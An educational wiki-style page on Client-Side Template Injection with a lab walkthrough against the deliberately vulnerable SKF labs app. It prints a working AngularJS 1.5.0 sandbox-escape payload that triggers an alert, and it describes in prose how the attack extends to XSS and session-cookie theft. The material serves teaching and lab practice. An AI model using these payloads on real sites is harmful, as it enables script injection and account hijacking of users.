**Client-Side Template Injection (CSTI)** is a security vulnerability in which an attacker can inject malicious code into a **client template**, which runs in the **user's browser** instead of the server.

Unlike [[Server-Side Template Injection (SSTI)]], where the server template runs on the server and is responsible for generating dynamic content, in CSTI, the client template runs in the user's browser and is used to generate dynamic content on the client side.

Attackers can exploit a CSTI vulnerability to inject malicious code into a client template, allowing them to execute commands in the user's browser and gain unauthorized access to the web application and sensitive data.

For example, imagine a web application uses client templates to generate dynamic content. An attacker could exploit a CSTI vulnerability to inject malicious code into the client template, allowing the attacker to execute commands in the user's browser and gain unauthorized access to the web application's sensitive data.

A common derivation of a Client-Side Template Injection (CSTI) attack is to exploit it to perform a [[Cross-Site Scripting (XSS)]] attack.

Once an attacker has injected malicious code into the client template, he can manipulate the data displayed to the user, allowing him to execute JavaScript code in the user's browser. Through this malicious code, the attacker can attempt to steal the user's session cookie, which would allow him to gain unauthorized access to the user's account and perform malicious actions on the user's behalf.

To prevent CSTI attacks, web application developers must properly validate and filter user input and use secure tools and template frameworks that implement security measures to prevent malicious code injection.

# Example

We need to clone the following repository from Github: [xkf-labs](https://github.com/blabla1337/skf-labs). Once downloaded, we proceed to go to the path *CSTI/python/CSTI* and install the requirements, and then run the script:

```
pip2 install -r requirements

python2 CSTI.py
```

We go to *localhost:5000*, see that we have an input to enter data and look at the source code of the page to see what technologies it is using. In this case it is using *AngularJS 1.5.0* so we can get in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) a payload to try to take advantage of this input.

For this version of *AngularJS* we found this payload. We should test it to see if it shows us an alert in the browser:

```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

As we see that it works we could try to show another type of text in the alert:

----
> Be careful about escaping quotation marks and special characters.
----

```
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("
    astNode=pop();astNode.type='UnaryExpression';
    astNode.operator='(window.X?void0:(window.X=true,alert(\"Test message!\")))+';
    astNode.argument={type:'Identifier',name:'foo'};
    ");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

As we can see we are able to introduce **JavaScript** code, so we could derive the attack to a [[Cross-Site Scripting (XSS)]].

**CSTI** tries to attack the user's browser, either to obtain a session cookie or anything else we control through a local *.js* file (**XSS**) and **SSTI** attacks the server in order to breach it, gain access or read files.